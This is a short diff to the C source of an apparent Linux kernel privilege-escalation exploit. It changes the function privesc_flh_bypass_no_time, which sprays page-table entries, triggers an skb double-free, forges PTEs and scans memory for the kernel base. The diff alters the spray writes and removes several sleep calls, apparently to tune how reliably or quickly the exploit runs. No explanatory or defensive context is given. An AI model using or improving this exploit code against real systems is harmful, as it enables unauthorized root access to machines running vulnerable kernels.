@@ -329,7 +329,8 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	// spray-allocate the PTEs from PCP allocator order-0 list
 	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
 	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
-		*(unsigned long long*)PTI_TO_VIRT(2, 0, i, 0, 0) = i;
+		*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;
+
 	PRINTF_VERBOSE("[*] double-freeing skb...\n");
 
 	// cause double-free on skb from earlier
@@ -360,7 +361,6 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 			printf("[+] confirmed double alloc PMD/PTE\n");
 			PRINTF_VERBOSE("    - PTE area index: %lld\n", i);
 			PRINTF_VERBOSE("    - PTE area (write target address/page): %016llx (new)\n", *test_target_addr);
-			sleep(3);
 			pte_area = test_target_addr;
 		}
 	}
@@ -395,7 +395,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 			pte_area[j] = (kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j) | 0x8000000000000867;
 
 		flush_tlb(_pmd_area, 0x400000);
-		sleep(1);
+
 		// scan 1 page (instead of CONFIG_PHYSICAL_ALIGN) for kernel base each iteration
 		for (unsigned long long j=0; j < 512; j++) 
 		{
